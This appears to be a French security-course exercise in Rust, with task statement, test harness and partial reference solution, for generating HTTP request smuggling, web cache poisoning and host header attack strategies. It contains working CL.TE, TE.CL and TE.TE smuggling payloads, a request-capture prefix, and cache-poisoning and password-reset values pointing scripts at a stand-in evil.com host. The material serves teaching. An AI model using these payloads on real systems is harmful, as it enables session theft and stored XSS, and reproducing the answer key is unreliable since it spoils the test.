# Exercice 3.3.10-a : http_smuggling_cache_attacks

**Module :**
3.3.10 â€” HTTP Smuggling & Cache Attacks

**Concept :**
a â€” HTTP Request Smuggling, Web Cache Poisoning, Host Header Attacks

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10)

**Type :**
code

**Tiers :**
1 â€” Concept isolÃ©

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- Module 3.3.1 (Protocol Dissector)
- Module 3.3.2 (REST API Security)
- ComprÃ©hension du protocole HTTP/1.1
- Connaissance des architectures reverse proxy

**Domaines :**
Net, Crypto, Struct

**DurÃ©e estimÃ©e :**
300 min

**XP Base :**
500

**ComplexitÃ© :**
T3 O(nÂ²) Ã— S2 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`http_smuggling_cache_attacks.rs`

**Fonctions autorisÃ©es :**
- `std::collections::*`
- `serde_json`
- `regex`
- Fonctions de manipulation de chaÃ®nes

**Fonctions interdites :**
- Toute bibliothÃ¨que HTTP externe
- RequÃªtes rÃ©seau rÃ©elles
- `unsafe` blocks

---

### 1.2 Consigne

#### 1.2.1 ğŸ¬ Contexte Fun â€” "INCEPTION" : Les RÃªves dans les RÃªves HTTP

**ğŸŒ€ "You mustn't be afraid to dream a little bigger, darling." â€” Eames**

Dans **Inception** de Christopher Nolan, Dom Cobb et son Ã©quipe plantent des idÃ©es dans l'esprit des victimes en naviguant Ã  travers des **couches de rÃªves imbriquÃ©es**. Chaque niveau de rÃªve a ses propres rÃ¨gles, son propre temps, et ce qui se passe Ã  un niveau affecte les autres.

**HTTP Request Smuggling, c'est exactement Ã§a :**
- **Le rÃªve de niveau 1 (Frontend)** : Nginx voit une requÃªte d'une certaine faÃ§on
- **Le rÃªve de niveau 2 (Backend)** : Apache interprÃ¨te la MÃŠME requÃªte diffÃ©remment
- **L'inception** : Tu "plantes" une requÃªte cachÃ©e qui n'existe que pour le backend

Comme l'Ã©quipe d'Inception qui exploite les **inconsistences entre les niveaux de rÃªves**, tu vas exploiter les **inconsistences entre les serveurs HTTP** pour faire passer des requÃªtes clandestines.

**Le Cache Poisoning**, c'est comme laisser un **totem piÃ©gÃ©** dans le rÃªve partagÃ© :
- Tu empoisonnes le cache avec du contenu malveillant
- Tous les futurs visiteurs reÃ§oivent ta version corrompue
- L'idÃ©e (malveillante) se propage Ã  tous !

**Les personnages de ton Ã©quipe :**
- **Content-Length** (Arthur) : PrÃ©cis, mÃ©thodique, compte chaque octet
- **Transfer-Encoding** (Eames) : Transformiste, change la faÃ§on de voir les donnÃ©es
- **Host Header** (Ariadne) : Architecte qui dÃ©finit oÃ¹ vont les requÃªtes
- **Cache** (Yusuf) : Le chimiste qui garde les rÃªves en mÃ©moire

---

#### 1.2.2 ğŸ“š Ã‰noncÃ© AcadÃ©mique

**Contexte technique :**

Les architectures web modernes utilisent souvent plusieurs serveurs en cascade :
- **Frontend (Reverse Proxy)** : Nginx, HAProxy, CDN
- **Backend (Application Server)** : Apache, Node.js, Gunicorn
- **Cache** : Varnish, Redis, CDN cache

**HTTP Request Smuggling** exploite les diffÃ©rences d'interprÃ©tation des en-tÃªtes HTTP entre ces composants, notamment :
- `Content-Length` : Indique la taille du body en octets
- `Transfer-Encoding: chunked` : Le body est dÃ©coupÃ© en morceaux (chunks)

Quand les deux headers sont prÃ©sents, les serveurs peuvent interprÃ©ter diffÃ©remment lequel utiliser.

**Ta mission :**

Ã‰crire une fonction `http_smuggling_cache_attacks` qui analyse une architecture web et gÃ©nÃ¨re des stratÃ©gies d'attaque appropriÃ©es.

**EntrÃ©e (JSON) :**
```json
{
  "architecture": {
    "frontend": "Nginx",
    "backend": "Apache",
    "cache": "Varnish"
  },
  "test_results": {
    "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
    "te_cl_test": {"response_delay": false}
  },
  "unkeyed_headers": ["X-Forwarded-Host", "X-Original-URL"],
  "target_endpoints": ["/admin", "/api/users", "/home"]
}
```

**Sortie (JSON) :**
```json
{
  "smuggling_analysis": {
    "vulnerability_type": "CL.TE",
    "detection_method": "Timing-based detection",
    "confidence": "HIGH",
    "explanation": "Frontend uses Content-Length, Backend uses Transfer-Encoding"
  },
  "exploit_payloads": [
    {
      "attack_type": "Request Hijacking",
      "payload": "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 49\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n",
      "description": "Hijack next user's request to access /admin",
      "severity": "CRITICAL"
    }
  ],
  "cache_poisoning": {
    "vulnerable_headers": ["X-Forwarded-Host"],
    "attack_vector": "Unkeyed header injection",
    "payload": {
      "header": "X-Forwarded-Host: evil.com",
      "cached_response": "<script src=//evil.com/xss.js></script>",
      "cache_key": "/home"
    },
    "impact": "Stored XSS via cache poisoning affecting all users"
  },
  "host_header_attacks": [
    {
      "attack_type": "Password Reset Poisoning",
      "payload": "Host: evil.com",
      "description": "Poison password reset links with attacker domain"
    }
  ],
  "chained_attacks": [
    {
      "name": "Smuggling + Cache Poison",
      "steps": [
        "Use CL.TE to smuggle request with X-Forwarded-Host: evil.com",
        "Smuggled request targets cacheable endpoint /home",
        "Backend generates response with evil.com in links",
        "Cache stores poisoned response for all users"
      ],
      "severity": "CRITICAL"
    }
  ],
  "mitigations": [
    "Normalize Content-Length/Transfer-Encoding handling",
    "Disable HTTP/1.0 support",
    "Include all relevant headers in cache key",
    "Use HTTP/2 end-to-end"
  ]
}
```

**Contraintes :**
- DÃ©tecter automatiquement le type de smuggling (CL.TE, TE.CL, TE.TE)
- GÃ©nÃ©rer des payloads syntaxiquement corrects
- Identifier les opportunitÃ©s de cache poisoning
- Proposer des attaques chaÃ®nÃ©es rÃ©alistes

**Exemples :**

| ScÃ©nario | Type DÃ©tectÃ© | Attaque Principale |
|----------|--------------|-------------------|
| Nginx â†’ Apache, CL.TE positif | CL.TE | Request Hijacking |
| HAProxy â†’ Node.js, TE.CL positif | TE.CL | Response Queue Poisoning |
| Varnish cache avec X-Forwarded-Host unkeyed | Cache Poison | Stored XSS |
| CDN â†’ Origin avec Host header reflection | Host Header | Password Reset Poison |

---

### 1.3 Prototype

```rust
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Point d'entrÃ©e principal - "The Dream is Collapsing!"
pub fn http_smuggling_cache_attacks(input_json: &str) -> String;
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 La DÃ©couverte du HTTP Smuggling

**HTTP Request Smuggling** a Ã©tÃ© dÃ©couvert en 2005 par Watchfire (Amit Klein), mais c'est **James Kettle** (PortSwigger) qui l'a remis au goÃ»t du jour en 2019 avec ses recherches rÃ©volutionnaires prÃ©sentÃ©es Ã  DEF CON et Black Hat.

### 2.2 Pourquoi Ã§a existe encore ?

La RFC 7230 stipule clairement : *"If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length."*

**MAIS** :
- Apache suit la RFC (prioritÃ© Ã  TE)
- Nginx peut Ãªtre configurÃ© diffÃ©remment
- Les CDN ont leurs propres comportements
- Le HTTP/1.0 legacy complique tout

### 2.3 Impact RÃ©el

- **2020** : Tesla - Cache Poisoning critique
- **2021** : PayPal - Request Smuggling permettant le vol de sessions
- **2022** : AWS ALB - VulnÃ©rabilitÃ© de smuggling
- **2023** : Multiples CDN affectÃ©s (Cloudflare, Akamai patchÃ©s)

### 2.5 DANS LA VRAIE VIE

| MÃ©tier | Utilisation |
|--------|-------------|
| **Pentester Web** | Test des architectures reverse proxy |
| **Bug Bounty Hunter** | Cibles high-value sur CDN/WAF bypass |
| **Security Engineer** | Configuration sÃ©curisÃ©e des proxies |
| **DevOps** | Hardening des architectures microservices |
| **SOC Analyst** | DÃ©tection des patterns de smuggling |

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
http_smuggling_cache_attacks.rs  main.rs  Cargo.toml

$ cargo build --release

$ cargo run
ğŸŒ€ HTTP Smuggling & Cache Attacks - "Time is not on our side"
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

[TEST 1] CL.TE Detection - Nginx â†’ Apache
âœ“ Smuggling Type: CL.TE detected via timing differential
âœ“ Exploit Payload: Request hijacking crafted
âœ“ Attack Scenarios: 3 generated

[TEST 2] Cache Poisoning - Unkeyed Headers
âœ“ Vulnerable Header: X-Forwarded-Host identified
âœ“ Cache Key Analysis: /home cacheable
âœ“ Stored XSS: Payload generated

[TEST 3] Host Header Attacks
âœ“ Password Reset Poisoning: Viable
âœ“ Web Cache Deception: Potential

[TEST 4] Chained Attack Generation
âœ“ Smuggling + Cache: Critical chain identified
âœ“ 4-step exploitation path generated

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“Š RÃ©sultats: 15/15 tests passÃ©s
ğŸ¬ "We need to go deeper!" - All levels exploited
```

---

### 3.1 ğŸ”¥ BONUS AVANCÃ‰ (OPTIONNEL)

**DifficultÃ© Bonus :**
ğŸ§  (12/10)

**RÃ©compense :**
XP Ã—6

**Time Complexity attendue :**
O(nÂ²)

**Space Complexity attendue :**
O(n)

**Domaines Bonus :**
`Net, Crypto, DP`

#### 3.1.1 Consigne Bonus

**ğŸŒ€ "INCEPTION NIVEAU 3" â€” HTTP/2 Smuggling & Request Tunneling**

Le HTTP/2 Ã©tait censÃ© rÃ©soudre le smuggling... **Jusqu'Ã  ce qu'on dÃ©couvre H2.CL et H2.TE !**

**Ta mission bonus :**

ImplÃ©menter la dÃ©tection et exploitation des nouvelles variantes :
1. **H2.CL Desync** : HTTP/2 â†’ HTTP/1.1 avec Content-Length
2. **H2.TE Desync** : HTTP/2 â†’ HTTP/1.1 avec Transfer-Encoding
3. **Request Tunneling** : Contourner les contrÃ´les du frontend
4. **Browser-Powered Smuggling** : Exploiter via fetch() cÃ´tÃ© client

**EntrÃ©e Bonus :**
```json
{
  "http2_enabled": true,
  "downgrade_behavior": "h2_to_h1",
  "h2_cl_test": {"injected_cl": "100", "response_truncated": true},
  "h2_te_test": {"chunked_accepted": true},
  "frontend_controls": {
    "blocked_paths": ["/admin", "/internal"],
    "blocked_methods": ["TRACE", "TRACK"]
  }
}
```

**Sortie Bonus :**
```json
{
  "h2_vulnerabilities": {
    "h2_cl_desync": {
      "vulnerable": true,
      "payload": ":method: POST\\n:path: /\\ncontent-length: 0\\n\\nGET /admin HTTP/1.1\\r\\nHost: internal\\r\\n\\r\\n",
      "bypass": "Frontend path restriction bypassed via tunneling"
    }
  },
  "request_tunneling": {
    "technique": "Encapsulated HTTP/1.1 in HTTP/2 body",
    "capabilities": ["Path restriction bypass", "Method restriction bypass", "Header injection"]
  },
  "browser_powered": {
    "fetch_payload": "fetch('/', {method: 'POST', body: smuggled_request})",
    "same_origin_exploit": true
  }
}
```

#### 3.1.2 Prototype Bonus

```rust
pub fn http2_smuggling_advanced(input_json: &str) -> String;
```

#### 3.1.3 Ce qui change par rapport Ã  l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Protocole | HTTP/1.1 only | HTTP/2 + downgrade |
| Smuggling Types | CL.TE, TE.CL | H2.CL, H2.TE, Tunneling |
| Vecteur | Server-to-server | Browser-powered possible |
| Bypass | Cache poisoning | Frontend control bypass |
| ComplexitÃ© | O(n) | O(nÂ²) avec graphe d'attaques |

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | Input | Expected | Points |
|------|-------|----------|--------|
| `test_cl_te_detection` | Nginxâ†’Apache, CL.TE delay | `CL.TE` type, timing method | 10 |
| `test_te_cl_detection` | HAProxyâ†’Node, TE.CL delay | `TE.CL` type | 10 |
| `test_te_te_detection` | Both TE variants | `TE.TE` with obfuscation | 10 |
| `test_no_smuggling` | Consistent parsing | `NOT_VULNERABLE` | 5 |
| `test_payload_cl_te` | CL.TE detected | Valid CL.TE payload | 15 |
| `test_payload_te_cl` | TE.CL detected | Valid TE.CL payload | 15 |
| `test_cache_unkeyed` | X-Forwarded-Host unkeyed | Cache poison attack | 10 |
| `test_cache_keyed` | All headers keyed | No cache poison | 5 |
| `test_host_header` | Host reflection | Password reset poison | 10 |
| `test_chain_attack` | Multiple vulns | Chained exploitation | 10 |

### 4.2 main.rs de test

```rust
use serde_json::{json, Value};

mod http_smuggling_cache_attacks;
use http_smuggling_cache_attacks::http_smuggling_cache_attacks;

fn main() {
    println!("ğŸŒ€ HTTP Smuggling & Cache Attacks - Test Suite");
    println!("â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n");

    let mut passed = 0;
    let mut total = 0;

    // Test 1: CL.TE Detection
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Nginx",
            "backend": "Apache",
            "cache": "Varnish"
        },
        "test_results": {
            "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": ["X-Forwarded-Host"],
        "target_endpoints": ["/admin", "/home"]
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["smuggling_analysis"]["vulnerability_type"] == "CL.TE" {
        println!("âœ“ Test 1: CL.TE detection");
        passed += 1;
    } else {
        println!("âœ— Test 1: CL.TE detection failed");
    }

    // Test 2: TE.CL Detection
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "HAProxy",
            "backend": "NodeJS",
            "cache": null
        },
        "test_results": {
            "cl_te_test": {"response_delay": false},
            "te_cl_test": {"response_delay": true, "timeout_seconds": 10}
        },
        "unkeyed_headers": [],
        "target_endpoints": ["/api"]
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["smuggling_analysis"]["vulnerability_type"] == "TE.CL" {
        println!("âœ“ Test 2: TE.CL detection");
        passed += 1;
    } else {
        println!("âœ— Test 2: TE.CL detection failed");
    }

    // Test 3: No Smuggling
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Nginx",
            "backend": "Nginx",
            "cache": null
        },
        "test_results": {
            "cl_te_test": {"response_delay": false},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": [],
        "target_endpoints": []
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["smuggling_analysis"]["vulnerability_type"] == "NOT_VULNERABLE"
       || parsed["smuggling_analysis"]["confidence"] == "NONE" {
        println!("âœ“ Test 3: No smuggling detected correctly");
        passed += 1;
    } else {
        println!("âœ— Test 3: False positive on non-vulnerable target");
    }

    // Test 4: Cache Poisoning via Unkeyed Header
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "CloudFront",
            "backend": "Origin",
            "cache": "CloudFront"
        },
        "test_results": {
            "cl_te_test": {"response_delay": false},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": ["X-Forwarded-Host", "X-Original-URL"],
        "target_endpoints": ["/home", "/login"]
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["cache_poisoning"]["vulnerable_headers"].as_array().unwrap().len() > 0 {
        println!("âœ“ Test 4: Cache poisoning via unkeyed headers");
        passed += 1;
    } else {
        println!("âœ— Test 4: Cache poisoning not detected");
    }

    // Test 5: CL.TE Payload Validation
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Nginx",
            "backend": "Apache",
            "cache": null
        },
        "test_results": {
            "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": [],
        "target_endpoints": ["/admin"]
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    let payload = parsed["exploit_payloads"][0]["payload"].as_str().unwrap_or("");
    if payload.contains("Content-Length") && payload.contains("Transfer-Encoding")
       && payload.contains("0\\r\\n\\r\\n") {
        println!("âœ“ Test 5: Valid CL.TE payload structure");
        passed += 1;
    } else {
        println!("âœ— Test 5: Invalid CL.TE payload");
    }

    // Test 6: Host Header Attack
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Nginx",
            "backend": "Django",
            "cache": null
        },
        "test_results": {
            "cl_te_test": {"response_delay": false},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": [],
        "target_endpoints": ["/password-reset"],
        "host_header_reflection": true
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["host_header_attacks"].as_array().map(|a| a.len() > 0).unwrap_or(false) {
        println!("âœ“ Test 6: Host header attack identified");
        passed += 1;
    } else {
        println!("âœ— Test 6: Host header attack missed");
    }

    // Test 7: Chained Attack
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Nginx",
            "backend": "Apache",
            "cache": "Varnish"
        },
        "test_results": {
            "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": ["X-Forwarded-Host"],
        "target_endpoints": ["/home"]
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["chained_attacks"].as_array().map(|a| a.len() > 0).unwrap_or(false) {
        println!("âœ“ Test 7: Chained attack strategy generated");
        passed += 1;
    } else {
        println!("âœ— Test 7: No chained attack generated");
    }

    // Test 8: TE.TE with Obfuscation
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Custom",
            "backend": "Custom",
            "cache": null
        },
        "test_results": {
            "cl_te_test": {"response_delay": false},
            "te_cl_test": {"response_delay": false},
            "te_te_test": {
                "obfuscation_variants": [
                    {"variant": "Transfer-Encoding: xchunked", "response_diff": true},
                    {"variant": "Transfer-Encoding : chunked", "response_diff": true}
                ]
            }
        },
        "unkeyed_headers": [],
        "target_endpoints": []
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["smuggling_analysis"]["vulnerability_type"] == "TE.TE" {
        println!("âœ“ Test 8: TE.TE obfuscation detected");
        passed += 1;
    } else {
        println!("âœ— Test 8: TE.TE detection failed");
    }

    // Test 9: Mitigation Recommendations
    total += 1;
    let input = json!({
        "architecture": {
            "frontend": "Nginx",
            "backend": "Apache",
            "cache": "Varnish"
        },
        "test_results": {
            "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
            "te_cl_test": {"response_delay": false}
        },
        "unkeyed_headers": ["X-Forwarded-Host"],
        "target_endpoints": ["/admin"]
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed["mitigations"].as_array().map(|a| a.len() >= 3).unwrap_or(false) {
        println!("âœ“ Test 9: Mitigation recommendations provided");
        passed += 1;
    } else {
        println!("âœ— Test 9: Insufficient mitigations");
    }

    // Test 10: Empty/Invalid Input
    total += 1;
    let input = json!({
        "architecture": {},
        "test_results": {},
        "unkeyed_headers": [],
        "target_endpoints": []
    });

    let result = http_smuggling_cache_attacks(&input.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    if parsed.get("error").is_some() || parsed["smuggling_analysis"]["confidence"] == "NONE" {
        println!("âœ“ Test 10: Invalid input handled gracefully");
        passed += 1;
    } else {
        println!("âœ— Test 10: Invalid input not handled");
    }

    println!("\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”");
    println!("ğŸ“Š RÃ©sultats: {}/{} tests passÃ©s", passed, total);

    if passed == total {
        println!("ğŸŒ€ \"The seed has been planted\" - All tests passed!");
    } else {
        println!("ğŸ’­ \"The dream is collapsing\" - Some tests failed");
    }
}
```

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;

#[derive(Debug, Serialize, Deserialize)]
struct Architecture {
    frontend: Option<String>,
    backend: Option<String>,
    cache: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct TestDelay {
    response_delay: bool,
    #[serde(default)]
    timeout_seconds: Option<u32>,
}

#[derive(Debug, Serialize, Deserialize)]
struct ObfuscationVariant {
    variant: String,
    response_diff: bool,
}

#[derive(Debug, Serialize, Deserialize)]
struct TeTeTest {
    obfuscation_variants: Vec<ObfuscationVariant>,
}

#[derive(Debug, Serialize, Deserialize)]
struct TestResults {
    #[serde(default)]
    cl_te_test: Option<TestDelay>,
    #[serde(default)]
    te_cl_test: Option<TestDelay>,
    #[serde(default)]
    te_te_test: Option<TeTeTest>,
}

#[derive(Debug, Serialize, Deserialize)]
struct Input {
    architecture: Architecture,
    test_results: TestResults,
    #[serde(default)]
    unkeyed_headers: Vec<String>,
    #[serde(default)]
    target_endpoints: Vec<String>,
    #[serde(default)]
    host_header_reflection: Option<bool>,
}

#[derive(Debug, Clone)]
enum SmugglingType {
    ClTe,
    TeCl,
    TeTe,
    NotVulnerable,
}

impl SmugglingType {
    fn as_str(&self) -> &'static str {
        match self {
            SmugglingType::ClTe => "CL.TE",
            SmugglingType::TeCl => "TE.CL",
            SmugglingType::TeTe => "TE.TE",
            SmugglingType::NotVulnerable => "NOT_VULNERABLE",
        }
    }
}

pub fn http_smuggling_cache_attacks(input_json: &str) -> String {
    // Parse input
    let input: Input = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => {
            return json!({
                "error": format!("Invalid input: {}", e),
                "smuggling_analysis": {
                    "vulnerability_type": "UNKNOWN",
                    "confidence": "NONE"
                }
            }).to_string();
        }
    };

    // Detect smuggling type
    let (smuggling_type, detection_method, confidence) = detect_smuggling_type(&input.test_results);

    // Generate exploit payloads
    let exploit_payloads = generate_exploit_payloads(&smuggling_type, &input.target_endpoints);

    // Analyze cache poisoning opportunities
    let cache_poisoning = analyze_cache_poisoning(&input.unkeyed_headers, &input.target_endpoints);

    // Analyze host header attacks
    let host_header_attacks = analyze_host_header(&input);

    // Generate chained attacks
    let chained_attacks = generate_chained_attacks(
        &smuggling_type,
        &input.unkeyed_headers,
        input.architecture.cache.is_some(),
    );

    // Generate mitigations
    let mitigations = generate_mitigations(&smuggling_type, &input.unkeyed_headers);

    // Build response
    let response = json!({
        "smuggling_analysis": {
            "vulnerability_type": smuggling_type.as_str(),
            "detection_method": detection_method,
            "confidence": confidence,
            "explanation": get_smuggling_explanation(&smuggling_type, &input.architecture)
        },
        "exploit_payloads": exploit_payloads,
        "cache_poisoning": cache_poisoning,
        "host_header_attacks": host_header_attacks,
        "chained_attacks": chained_attacks,
        "mitigations": mitigations
    });

    response.to_string()
}

fn detect_smuggling_type(test_results: &TestResults) -> (SmugglingType, String, String) {
    // Check CL.TE
    if let Some(cl_te) = &test_results.cl_te_test {
        if cl_te.response_delay {
            return (
                SmugglingType::ClTe,
                "Timing-based detection: Frontend uses Content-Length, Backend uses Transfer-Encoding".to_string(),
                "HIGH".to_string(),
            );
        }
    }

    // Check TE.CL
    if let Some(te_cl) = &test_results.te_cl_test {
        if te_cl.response_delay {
            return (
                SmugglingType::TeCl,
                "Timing-based detection: Frontend uses Transfer-Encoding, Backend uses Content-Length".to_string(),
                "HIGH".to_string(),
            );
        }
    }

    // Check TE.TE with obfuscation
    if let Some(te_te) = &test_results.te_te_test {
        for variant in &te_te.obfuscation_variants {
            if variant.response_diff {
                return (
                    SmugglingType::TeTe,
                    format!("TE.TE via obfuscation: {}", variant.variant),
                    "MEDIUM".to_string(),
                );
            }
        }
    }

    (
        SmugglingType::NotVulnerable,
        "No timing differential detected".to_string(),
        "NONE".to_string(),
    )
}

fn get_smuggling_explanation(smuggling_type: &SmugglingType, arch: &Architecture) -> String {
    let frontend = arch.frontend.as_deref().unwrap_or("Unknown");
    let backend = arch.backend.as_deref().unwrap_or("Unknown");

    match smuggling_type {
        SmugglingType::ClTe => format!(
            "{} (frontend) processes Content-Length first, while {} (backend) processes Transfer-Encoding. \
            This allows smuggling additional requests in the body.",
            frontend, backend
        ),
        SmugglingType::TeCl => format!(
            "{} (frontend) processes Transfer-Encoding first, while {} (backend) processes Content-Length. \
            Chunked encoding can hide extra requests.",
            frontend, backend
        ),
        SmugglingType::TeTe => format!(
            "Both {} and {} use Transfer-Encoding, but handle obfuscated variants differently. \
            Variations like 'Transfer-Encoding: xchunked' may be processed inconsistently.",
            frontend, backend
        ),
        SmugglingType::NotVulnerable =>
            "No request smuggling vulnerability detected. Both servers parse HTTP consistently.".to_string(),
    }
}

fn generate_exploit_payloads(smuggling_type: &SmugglingType, targets: &[String]) -> Vec<Value> {
    let mut payloads = Vec::new();

    match smuggling_type {
        SmugglingType::ClTe => {
            // Basic CL.TE payload
            let smuggled_path = targets.first().map(|s| s.as_str()).unwrap_or("/admin");
            let smuggled_request = format!("GET {} HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n", smuggled_path);
            let smuggled_len = smuggled_request.len();

            payloads.push(json!({
                "attack_type": "Request Hijacking",
                "payload": format!(
                    "POST / HTTP/1.1\\r\\n\
                    Host: target.com\\r\\n\
                    Content-Length: {}\\r\\n\
                    Transfer-Encoding: chunked\\r\\n\\r\\n\
                    0\\r\\n\\r\\n{}",
                    smuggled_len + 5, smuggled_request
                ),
                "description": format!("Smuggle request to {} by prefixing next user's request", smuggled_path),
                "severity": "CRITICAL"
            }));

            // Request prefix attack
            payloads.push(json!({
                "attack_type": "Request Prefix",
                "payload": "POST / HTTP/1.1\\r\\n\
                    Host: target.com\\r\\n\
                    Content-Length: 30\\r\\n\
                    Transfer-Encoding: chunked\\r\\n\\r\\n\
                    0\\r\\n\\r\\n\
                    GET /steal?x=",
                "description": "Capture next user's request as query parameter",
                "severity": "HIGH"
            }));
        }
        SmugglingType::TeCl => {
            let smuggled_path = targets.first().map(|s| s.as_str()).unwrap_or("/admin");

            payloads.push(json!({
                "attack_type": "Request Hijacking",
                "payload": format!(
                    "POST / HTTP/1.1\\r\\n\
                    Host: target.com\\r\\n\
                    Content-Length: 4\\r\\n\
                    Transfer-Encoding: chunked\\r\\n\\r\\n\
                    5e\\r\\n\
                    GPOST / HTTP/1.1\\r\\n\
                    Host: target.com\\r\\n\
                    Content-Length: 15\\r\\n\\r\\n\
                    x=1\\r\\n\
                    0\\r\\n\\r\\n"
                ),
                "description": "TE.CL smuggling to inject request",
                "severity": "CRITICAL"
            }));
        }
        SmugglingType::TeTe => {
            payloads.push(json!({
                "attack_type": "TE.TE Obfuscation",
                "payload": "POST / HTTP/1.1\\r\\n\
                    Host: target.com\\r\\n\
                    Content-Length: 4\\r\\n\
                    Transfer-Encoding: chunked\\r\\n\
                    Transfer-Encoding: xchunked\\r\\n\\r\\n\
                    0\\r\\n\\r\\n\
                    GET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n",
                "description": "Exploit differential handling of obfuscated TE headers",
                "severity": "HIGH"
            }));
        }
        SmugglingType::NotVulnerable => {}
    }

    payloads
}

fn analyze_cache_poisoning(unkeyed_headers: &[String], targets: &[String]) -> Value {
    if unkeyed_headers.is_empty() {
        return json!({
            "vulnerable_headers": [],
            "attack_vector": "No unkeyed headers identified",
            "payload": null,
            "impact": "Cache poisoning not viable without unkeyed headers"
        });
    }

    let mut attacks = Vec::new();

    for header in unkeyed_headers {
        let (payload, cached_response, impact) = match header.as_str() {
            "X-Forwarded-Host" => (
                format!("{}: evil.com", header),
                "<script src=//evil.com/xss.js></script>",
                "Stored XSS via host header reflection in cached response"
            ),
            "X-Original-URL" | "X-Rewrite-URL" => (
                format!("{}: /admin", header),
                "Admin panel content served to all users",
                "Access control bypass via URL rewriting"
            ),
            "X-Forwarded-Scheme" => (
                format!("{}: http", header),
                "http:// links in cached response",
                "SSL stripping via cached mixed content"
            ),
            _ => (
                format!("{}: malicious-value", header),
                "Reflected malicious content",
                "Depends on application behavior"
            ),
        };

        attacks.push(json!({
            "header": header,
            "payload": payload,
            "cached_response": cached_response
        }));
    }

    let primary_target = targets.first().map(|s| s.as_str()).unwrap_or("/home");

    json!({
        "vulnerable_headers": unkeyed_headers,
        "attack_vector": "Unkeyed header injection",
        "payload": {
            "header": attacks.first().map(|a| a["payload"].clone()).unwrap_or(Value::Null),
            "cached_response": attacks.first().map(|a| a["cached_response"].clone()).unwrap_or(Value::Null),
            "cache_key": primary_target
        },
        "impact": "Stored XSS via cache poisoning affecting all users",
        "all_vectors": attacks
    })
}

fn analyze_host_header(input: &Input) -> Vec<Value> {
    let mut attacks = Vec::new();

    // Check for host header reflection
    if input.host_header_reflection.unwrap_or(false) {
        attacks.push(json!({
            "attack_type": "Password Reset Poisoning",
            "payload": "Host: evil.com",
            "description": "Password reset links will contain evil.com domain, capturing tokens",
            "prerequisites": ["Application reflects Host header in password reset emails"],
            "severity": "HIGH"
        }));

        attacks.push(json!({
            "attack_type": "Web Cache Deception",
            "payload": "Host: target.com\\r\\nX-Forwarded-Host: evil.com",
            "description": "Serve cached responses with malicious host in links",
            "severity": "MEDIUM"
        }));
    }

